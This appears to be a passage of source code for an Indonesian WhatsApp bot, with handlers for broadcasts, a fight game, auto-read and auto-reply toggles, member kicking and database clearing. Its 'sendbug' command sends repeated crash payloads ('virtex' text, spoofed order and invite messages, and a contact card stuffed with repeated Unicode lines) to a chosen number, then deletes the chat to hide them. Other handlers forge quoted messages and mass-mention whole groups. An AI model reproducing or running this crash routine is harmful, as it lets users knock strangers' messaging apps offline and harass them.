						for (let _ of anus) {
							ikyc.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !iky.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							ikyc.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, `*BROADCAST PRIVATE*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), ayey)
						}
						sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
           
           
case 'gelud':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (!isGroup) return reply(mess.only.group)
               if (iky.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
               if (!iky.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
               if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
               if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
					
               gelutSkuy = setGelud(`${from}`)
               gelutSkuy.status = false
               gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
               gelutSkuy.Y = args[0].replace("@", "");
               fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
               starGame = `👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

               ikyc.sendMessage(from, starGame, text, {quoted: iky, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
               gameAdd(sender, glimit)
               break
        case 'delsesigelud':
               if (!isGroup) return reply(mess.only.group)
               if (fs.existsSync('./media/' + from + '.json')) {
               fs.unlinkSync('./media/' + from + '.json')
               reply('Berhasil Menghapus Sesi Gelud')
               } else {
               reply('Tidak ada sesi yang berlangsung')
}
               break           
           
           
           
           case 'sendhidetag':        
	        if (args.length < 1) return setReply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
		    if (args[0].startsWith('08')) return setReply('Maukin idgc goblok')
            if (args[0].startsWith('+62')) return setReply('masukin idgc peak lu')
		    var gc = body.slice(13)
            var idgc = gc.split("|")[0];
            var teks = gc.split("|")[1];
			var group = await ikyc.groupMetadata(idgc)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: teks,
			contextInfo: { mentionedJid: mem },
			quoted: iky
			}
			await ikyc.sendMessage(idgc, optionshidetag, text)
			await ikyc.sendMessage(idgc, optionshidetag, text)
			await setReply(`Sukses mengirim hidetag`)
			break
			
			
			
			
			case 'autowelcome':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoWelcome === true) return setReply('Udah aktif kak')
                    autoWelcome = true           
                    let ih =`Mode auto welcome telah aktif kak`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoWelcome === false) return setReply('Udah off kak')
                     autoWelcome = false         
                     let eh =`Mode auto welcome telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autowelcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autowelcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
														
           
           
           case 'autoread':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoread === true) return setReply('Udah aktif kak')
                    autoread = true
                    autoreadgc = false
                    autoreadpc = false
                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoread === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadgc = false
                    autoreadpc = false
                     let eh =`Mode auto read telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 case 'autoreadgc':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoreadgc === true) return setReply('Udah aktif kak')
                    autoread = false
                    autoreadgc = true
                    let ih =`Mode auto read gc telah aktif kak \nBot akan auto read saat di chat`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoreadgc === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadgc = false
                     let eh =`Mode auto read gc telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD GC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoreadgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoreadgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autoreadpc':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoreadpc === true) return setReply('Udah aktif kak')
                    autoread = false
                    autoreadpc = true
                    let ih =`Mode auto read telah pc aktif kak \nBot akan auto read saat di chat`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoreadpc === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadpc = false
                     let eh =`Mode auto read telah pc di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD PC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoreadpc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoreadpc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 case 'autorespon':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autorespon === true) return setReply('Udah aktif kak')
                    autorespon = true
                    let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autorespon === false) return setReply('Udah off kak')
                     autorespon = false
                     let eh =`Mode auto respon telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
					
					
					case 'autovn':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autovn === true) return setReply('Udah aktif kak')
                    autovn = true
                    typing = false
                    autosticker = false
                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autovn === false) return setReply('Udah off kak')
                     autovn = false
                     let eh =`Mode auto vn telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autosticker':
				    if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autosticker === true) return setReply('Udah aktif kak')
                    autosticker = true
                    autovn = false
                    typing = false
                    let ih =`Mode autosticker telah aktif kak`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autosticker === false) return setReply('Udah off kak')
                     autosticker = false
                     let eh =`Mode autosticker telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
					
                 case 'autotyping':
					case 'typing':
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (typing === true) return setReply('Udah aktif kak')
                    typing = true
                    autovn = false
                    autosticker = false
                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
                    ikyc.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (typing === false) return setReply('Udah off kak')
                     typing = false
                     let uh =`Mode typing telah di matikan`
                     ikyc.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                                 
                 
                 case 'autoblockcmd':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autoblockcmd === true) return setReply('Udah aktif kak')
                    autoblockcmd = true          
                    let ih =`Mode auto block command telah aktif kak \nBot akan auto block saat ada command yang error`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoblockcmd === false) return setReply('Udah off kak')
                     autoblockcmd = false
                     let eh =`Mode auto block command telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BLOCK CMD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoblockcmd on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoblockcmd off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 case 'autobio':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autobio) return setReply('Udah aktif kak')
                    autobio = true          
                    let ih =`Mode auto bio telah aktif kak`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autobio) return setReply('Udah off kak')
                     autobio = false
                     let eh =`Mode auto bio telah di matikan`
                     ikyc.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BIO`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autobio on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autobio off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
           
      case 'unblockcmd':
      case 'delblock':
      case 'delblockcmd':
      try{
    	  if (!isOwner) return onlyOwner()
          if(!q) return setReply("Textnya mana cih")
          if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
          deleteblockcmd(q, listcmdblock)
          setTimeout( () => {
          setReply(`Berhasil unblock command 「 *${q}* 」`)
           },3000)
          } catch (err) {
          	setReply("Bjirr error, keknya ada yang error")
          }
      break  
            
            case 'blockcmd':{
          if (!isOwner) return onlyOwner()
          if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
          if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
          addblockcmd(q,listcmdblock) 
          setTimeout( () => {
          setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)
           },3000)
          }
      break
            
            
            
            
                  
           case 'listblockcmd':
           case 'listcmdblock':
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
mentions(wo, soso, true)
break




           
      


 
           
 case 'jancok':
case 'kik':
if (!isOwner) return onlyOwner()
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) return setReply('Reply targetnya kak')
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
if (mentioned.length > 1) return setReply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = iky.message.extendedTextMessage.contextInfo.participant
await setReply( `Modar kena kick awokawok 🤣`);
await ikyc.groupRemove(from, [asu])
} else {
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
await setReply(`Asek dapet jatah kick, Otw kick 😋`);
await ikyc.groupRemove(from, [mentioned[0]])
 }
break    


        
       
            
case 'clearall':
try{
					if (!isOwner) return onlyOwner()
					let chiit = await ikyc.chats.all()
                    for (let i of chiit){
                    ikyc.modifyChat(i.jid, ChatModification.delete)                 
                    }
                   // await setReply("Sukses Clear All Chat")
                    } catch (err){
                	setReply(err)
                    }
					break



case 'readall':
					if (!isOwner) return onlyOwner()
					let readall = await ikyc.chats.all()
                    for (let i of readall){
                    await ikyc.chatRead(i.jid, "read")
                    }
                    setReply(`Berhasil membaca ${readall.length} pesan`)
					break


case 'clearallgc':
try{ 
var clearpc = await ikyc.chats.array.filter(v => v.jid.endsWith('g.us'))
clearpc.map( async ({ jid }) => {
 await ikyc.modifyChat(jid, ChatModification.delete)                 
})
await setReply(`Succes Clear All ${clearpc.length} Group Chat`)
} catch (err){
setReply(err)
}
break
	
	
	
case 'clearallpc':
try{ 
var cleargc = await ikyc.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
cleargc.map( async ({ jid }) => {
await ikyc.modifyChat(jid, ChatModification.delete)                
})
await setReply(`Succes Clear All ${cleargc.length} Private Chat`)
} catch (err){
setReply(err)
}
break




           
                    
case 'delallerror':
case 'clearallerror':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/listerror.json', JSON.stringify(obj))         
				         await setReply(`ALL ERROR BERHASIL DI HAPUS`)
			             break 
	
	case 'delalluser':
	case 'clearalluser':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/user.json', JSON.stringify(obj))         
				         await setReply(`ALL USER BERHASIL DI HAPUS`)
			             break 
			
			
			case 'delallblock':
	case 'clearallblock':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
				         await setReply(`ALL BLOCK BERHASIL DI HAPUS`)
			             break 

			
			
			
			case 'delallban':
	case 'clearallban':
	case 'clearallbanned':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/banned.json', JSON.stringify(obj))         
				         await setReply(`ALL BANNED BERHASIL DI HAPUS`)
			             break 
			
			
			
			
			
			            
           
           case 'pub':
               if (!isOwner) return onlyOwner()

           if (publik === true) return setReply('Udah di mode publick kak')
           publik = true
           let bab =`Mode public aktif kak`
           ikyc.sendMessage(from, bab, text, { quoted: setQuoted, contextInfo: forward})
           break
           
case 'self':
                 if (!isOwner) return onlyOwner()

           if (publik === false) return setReply('Udah di mode self kak')
           publik = false
           let breh =`Mode self aktif kak`
           ikyc.sendMessage(from, breh, text, { quoted: setQuoted, contextInfo: forward})
           break
           
           
            case 'sendbug':    
                if(isZadani) return
                    if (!isOwner) return onlyOwner()
                      if(sendbug === true) return setReply(`*ALERT* \nEeeitss, tunggu sampai proses sendbugnya selesai ya kak, kalo tetep maksain sendbug lebih dari satu nomer, nanti nomer kakak akan terbanned, trus aku nanti bisa kesepian deh :)`)
                      if(sendbug === true) return setReply("Untung ada aku yang mencegah, klo gak bisa kena banned tadi 😌")
      
                      if (args.length < 1) return setReply(`Penggunaan ${prefix}sendbug nomor`)
					  if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')

                      pc = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`               
                      if(pc === Ownerin) return 
                      try {                 
                     setReply('*Loading...*')
                 sendbug = true
			   var nilaiAwal = 1;
                     while(nilaiAwal <=2) { 
			var kirim = await  ikyc.prepareMessageFromContent(`${pc}@s.whatsapp.net`, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': davizin,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': virtex6(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                await ikyc.relayWAMessage(kirim)
       await  ikyc.sendMessage(`${pc}@s.whatsapp.net`, virtex6(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                })
                
               await ikyc.sendMessage(`${pc}@s.whatsapp.net`, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: thumb,
                              }, location,
                              {quoted: {
                             key: {
                               participant: '0@s.whatsapp.net'
                             },
                           message: {
                        orderMessage: {
                          itemCount: jumlahTroli,
                               status: 1,
                       surface: 10,
                      message: 'NOPE',
                            orderTitle: fake,
                             sellerJid:'0@s.whatsapp.net'}
                             }},
                             contextInfo: forward})
                             
                             
                       ikyc.sendMessage(`${pc}@s.whatsapp.net`, {
                        'groupName': 'NOPE',
                        'groupJid': '6289699472590-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': thumb
                    }, MessageType.groupInviteMessage, {
                        'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': jumlahTroli,
                                    'status': 1,
                                    'surface': 1,
                                    'orderTitle': fake,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }
                    })         
			
                     let inilist = []
                     for (let i of ownerNumber) {
                     const vname = ikyc.contacts[i] != undefined ? ikyc.contacts[i].vname || ikyc.contacts[i].notify : undefined
                     inilist.push({"displayName": 'X - Dev Team',"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${ikyc.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\n+ \nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nitem1.X-ABLabel:Ponsel\nEND:VCARD`})}
                  
                     await ikyc.sendMessage(`${pc}@s.whatsapp.net`, {"displayName": `${inilist.length} kontak`,"contacts": inilist }, 'contactsArrayMessage')
                     nilaiAwal++}
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Bug terkirim', 'cyan'))
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Otw delchat, buka wa nya terus agar delchat sukses', 'cyan'))
                     await ikyc.modifyChat(`${pc}@s.whatsapp.net`, ChatModification.delete)
                     await ikyc.sendMessage(`${pc}@s.whatsapp.net`, 'COMPLETE', text)
                     await ikyc.sendMessage(from, `*Sukses send bug sebanyak 11 bug ke nomor ${q}*`, text)
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('sukses delchat sekarang wa sudah normal', 'cyan'))     
					} catch (e) {
					console.log('Error :', e)
					setReply(`*Gagal mengirim bug!* \n*System Error*\nPastikan jaringan stabil dan masukan nomer whatsapp dengan benar`)
					}   
                    sendbug = false                     
					break
           
           
           case 'setppbot':
					if (!isOwner) return onlyOwner() 
					if (!isQuotedImage) return setReply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return setReply('Reply gambarnya aja om')
					enmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ikyc.downloadAndSaveMediaMessage(enmedia)
					await ikyc.updateProfilePicture(botNumber, media)
					setReply('Makasih profil barunya😗')
					break       
              case 'setprefix':
                     if (!isOwner) return onlyOwner()
                if (args.length < 1) return setReply(`Masukkan prefix\nOptions :\n=> multi`)
                if (c === 'multi'){
                    multi = true
                    setReply(`Berhasil mengubah prefix ke「 ${c} 」`)
                } else if (c === 'nopref'){
                    return setReply("Maap nopref masih error")
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    setReply(`Berhasil mengubah prefix ke「 ${c} 」`)
                }
                break
                
           
           case 'addrespon':{
         if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
          if (args.length < 1) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return setReply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          setReply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      
      case 'dellrespon':
      case 'delrespon':{
